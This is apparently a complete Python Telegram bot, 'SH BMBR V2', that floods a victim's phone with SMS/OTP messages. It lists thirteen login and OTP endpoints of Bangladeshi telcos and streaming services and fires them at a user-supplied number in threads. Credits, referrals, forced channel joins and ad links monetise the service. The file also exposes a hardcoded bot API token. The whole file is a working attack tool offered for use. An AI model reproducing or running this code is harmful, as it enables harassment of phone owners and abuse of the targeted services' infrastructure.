import telebot
import requests
import threading
import time
import sqlite3
from concurrent.futures import ThreadPoolExecutor
from telebot import types

# ==========================================
# ⚙️ CONFIGURATION
# ==========================================
API_TOKEN = '8621602769:AAHWHywjPO4ej7diKdv8TdPGdJ-TCbKSoxk' 
ADMIN_ID = 6941003064  
CHANNEL_ID = '@SH_tricks' 
CHANNEL_LINK = 'https://t.me/SH_tricks'
AD_LINK = "https://www.effectivegatecpm.com/wnbk2zjv?key=75442aee9e8b64a0d71c17a99228474d"

bot = telebot.TeleBot(API_TOKEN)
user_data_temp = {} 

# Database Setup
conn = sqlite3.connect('sh_bmbr.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS users 
                  (user_id INTEGER PRIMARY KEY, credits INTEGER DEFAULT 0, 
                  is_ban INTEGER DEFAULT 0, is_vip INTEGER DEFAULT 0, can_claim INTEGER DEFAULT 0)''')
conn.commit()

# ==========================================
# ⚡ ALL APIs
# ==========================================
def api_gp1(t): requests.get(f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={t}", timeout=5)
def api_gp2(t): requests.post("https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp", json={"phone": t}, timeout=5)
def api_robi1(t): requests.post("https://da-api.robi.com.bd/da-nll/otp/send", json={"msisdn": t}, timeout=5)
def api_robi2(t): requests.post("https://www.robi.com.bd/bn", data=f'msisdn={t}', headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=5)
def api_airtel1(t): requests.post("https://www.bd.airtel.com/en", data=f'msisdn={t}', headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=5)
def api_bl1(t): requests.post("https://eshop-api.banglalink.net/api/v1/customer/send-otp", json={"phone": t}, timeout=5)
def api_bl2(t): requests.post("https://web-api.banglalink.net/api/v1/user/otp-login/request", json={"mobile": t}, timeout=5)
def api_binge(t): requests.get(f"https://web-api.binge.buzz/api/v3/otp/send/{t}", timeout=5)
def api_chorki(t): requests.post("https://api-dynamic.chorki.com/v2/auth/login", json={"number": f"+88{t}"}, timeout=5)
def api_hoichoi(t): requests.post("https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code", json={"phoneNumber": f"+88{t}"}, timeout=5)
def api_bioscope(t): requests.post("https://api-dynamic.bioscopelive.com/v2/auth/login", json={"number": f"+88{t}"}, timeout=5)
def api_redx(t): requests.post("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", json={"phoneNumber": t}, timeout=5)
def api_apex(t): requests.post("https://api.apex4u.com/api/auth/login", json={"phoneNumber": t}, timeout=5)

all_apis = [api_gp1, api_gp2, api_robi1, api_robi2, api_airtel1, api_bl1, api_bl2, api_binge, api_chorki, api_hoichoi, api_bioscope, api_redx, api_apex]

# ==========================================
# 🚫 ANTI-LEAVE & FORCE JOIN
# ==========================================
@bot.chat_member_handler()
def monitor_leave(update):
    user_id = update.new_chat_member.user.id
    status = update.new_chat_member.status
    if status in ['left', 'kicked']:
        cursor.execute("UPDATE users SET is_ban=1 WHERE user_id=?", (user_id,))
        conn.commit()
        try:
            bot.ban_chat_member(CHANNEL_ID, user_id)
            bot.send_message(ADMIN_ID, f"🚫 **Auto Ban!** User {user_id} left channel.")
        except: pass

def is_subscribed(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

def check_access(message):
    user = get_user(message.from_user.id)
    if user[2] == 1:
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return False
    if not is_subscribed(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK))
        markup.add(types.InlineKeyboardButton("🔄 Verify", callback_data="verify"))
        bot.send_message(message.chat.id, "❗ Age channel-e join korun, nahole bot kaaj korbe na.", reply_markup=markup)
        return False
    return True

# ==========================================
# 🛠 UTILS & DB (NEW USER 2 CREDIT FREE)
# ==========================================
def get_user(user_id):
    cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    user = cursor.fetchone()
    if not user:
        # Notun user-ke 2 credit free deya hocche
        cursor.execute("INSERT INTO users (user_id, credits) VALUES (?, ?)", (user_id, 2))
        conn.commit()
        return (user_id, 2, 0, 0, 0)
    return user

def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add("🚀 Start Attack", "💰 Refer to Earn", "📺 Watch Ad", "👤 My Profile")
    return markup

# ==========================================
# 🎮 HANDLERS
# ==========================================
@bot.message_handler(commands=['start'])
def start(message):
    if not check_access(message): return
    if " " in message.text:
        ref_id = message.text.split()[1]
        if ref_id.isdigit() and int(ref_id) != message.from_user.id:
            cursor.execute("UPDATE users SET credits = credits + 3 WHERE user_id=?", (ref_id,))
            conn.commit()
            try: bot.send_message(ref_id, "🎉 Someone joined! +3 Credits added.")
            except: pass
    bot.reply_to(message, "<b>🚀 SH BMBR V2 🔥</b>\nWelcome! New users got 2 Credits free.", reply_markup=main_menu(), parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify(call):
    if is_subscribed(call.from_user.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(call.message.chat.id, "✅ Verified! Ekhon bot use korun.", reply_markup=main_menu())
    else: bot.answer_callback_query(call.id, "❌ Age join korun!", show_alert=True)

@bot.message_handler(func=lambda m: m.text == "👤 My Profile")
def profile(message):
    if not check_access(message): return
    user = get_user(message.from_user.id)
    status = "VIP 🌟" if user[3] == 1 else "Free User"
    bot.reply_to(message, f"👤 ID: <code>{user[0]}</code>\n💰 Credits: {user[1]}\n⚡ Status: {status}", parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "💰 Refer to Earn")
def refer(message):
    if not check_access(message): return
    bot.reply_to(message, f"🔗 Link: https://t.me/{(bot.get_me()).username}?start={message.from_user.id}")

@bot.message_handler(func=lambda m: m.text == "📺 Watch Ad")
def ad(message):
    if not check_access(message): return
    cursor.execute("UPDATE users SET can_claim=1 WHERE user_id=?", (message.from_user.id,))
    conn.commit()
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔗 Open Ad", url=AD_LINK))
    markup.add(types.InlineKeyboardButton("✅ Claim", callback_data="claim"))
    bot.send_message(message.chat.id, "Ad-ti dekhun ebong claim korun.", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "claim")
def claim_credits(call):
    user = get_user(call.from_user.id)
    if user[4] == 1:
        cursor.execute("UPDATE users SET credits = credits + 3, can_claim = 0 WHERE user_id=?", (call.from_user.id,))
        conn.commit()
        bot.answer_callback_query(call.id, "✅ +3 Credits Added!", show_alert=True)
        bot.edit_message_text("🎉 Credit claim kora hoyeche!", call.message.chat.id, call.message.message_id)
    else: bot.answer_callback_query(call.id, "❌ Age Ad button-e click korun!", show_alert=True)

# ==========================================
# 💥 ATTACK SYSTEM
# ==========================================
@bot.message_handler(func=lambda m: m.text == "🚀 Start Attack")
def start_at(message):
    if not check_access(message): return
    msg = bot.send_message(message.chat.id, "📱 Target number din (11 digit):")
    bot.register_next_step_handler(msg, get_amount)

def get_amount(message):
    target = message.text
    if len(target) == 11 and target.isdigit():
        user_data_temp[message.from_user.id] = target
        bot.send_message(message.chat.id, "🔢 Koyti round dite chan? (Max 100):")
        bot.register_next_step_handler(message, run_bombing)
    else: bot.reply_to(message, "❌ Bhul number!")

def run_bombing(message):
    try:
        rounds = int(message.text)
        if rounds > 100: rounds = 100
        uid = message.from_user.id
        target = user_data_temp[uid]
        user = get_user(uid)

        if user[3] == 0 and user[1] < 1:
            bot.reply_to(message, "❌ Credit nai! Ad dekhun.")
            return
        
        if user[3] == 0:
            cursor.execute("UPDATE users SET credits = credits - 1 WHERE user_id=?", (uid,))
            conn.commit()

        bot.send_message(message.chat.id, f"🚀 **Attack Started on {target}**\nRounds: {rounds}")
        threading.Thread(target=bombing_engine, args=(message.chat.id, target, rounds)).start()
    except: bot.reply_to(message, "❌ Shothik songkha din.")

def bombing_engine(chat_id, target, rounds):
    total = 0
    def attack(api):
        nonlocal total
        for _ in range(rounds):
            try: api(target); total += 1; time.sleep(1)
            except: pass
    with ThreadPoolExecutor(max_workers=250) as ex:
        for a in all_apis: ex.submit(attack, a)
    bot.send_message(chat_id, f"✅ **Attack Done!**\nTarget: {target}\nTotal: {total}\nCredit: @Suptho1")

# ==========================================
# 👑 ADMIN PANEL
# ==========================================
@bot.message_handler(commands=['admin'])
def admin_p(message):
    if message.from_user.id == ADMIN_ID:
        cursor.execute("SELECT COUNT(*) FROM users")
        count = cursor.fetchone()[0]
        bot.reply_to(message, f"👑 **Admin Menu**\nUsers: {count}\n\n/ban ID\n/unban ID\n/add_credit ID Amt\n/set_vip ID\n/broadcast Message")

@bot.message_handler(commands=['ban'])
def ban_u(message):
    if message.from_user.id == ADMIN_ID:
        uid = message.text.split()[1]
        cursor.execute("UPDATE users SET is_ban=1 WHERE user_id=?", (uid,))
        conn.commit()
        bot.reply_to(message, "🚫 User Banned.")

@bot.message_handler(commands=['unban'])
def unban_u(message):
    if message.from_user.id == ADMIN_ID:
        uid = message.text.split()[1]
        cursor.execute("UPDATE users SET is_ban=0 WHERE user_id=?", (uid,))
        conn.commit()
        try: bot.unban_chat_member(CHANNEL_ID, uid)
        except: pass
        bot.reply_to(message, "✅ User Unbanned.")

@bot.message_handler(commands=['add_credit'])
def add_cr(message):
    if message.from_user.id == ADMIN_ID:
        _, uid, amt = message.text.split()
        cursor.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (amt, uid))
        conn.commit()
        bot.reply_to(message, "✅ Credits Added.")

@bot.message_handler(commands=['set_vip'])
def set_v(message):
    if message.from_user.id == ADMIN_ID:
        uid = message.text.split()[1]
        cursor.execute("UPDATE users SET is_vip=1 WHERE user_id=?", (uid,))
        conn.commit()
        bot.reply_to(message, "🌟 VIP kora hoyeche.")

@bot.message_handler(commands=['broadcast'])
def bcast(message):
    if message.from_user.id == ADMIN_ID:
        txt = message.text.replace('/broadcast ', '')
        cursor.execute("SELECT user_id FROM users")
        for u in cursor.fetchall():
            try: bot.send_message(u[0], f"📢 **Notice:**\n\n{txt}")
            except: pass

if __name__ == "__main__":
    bot.infinity_polling(allowed_updates=["message", "callback_query", "chat_member"])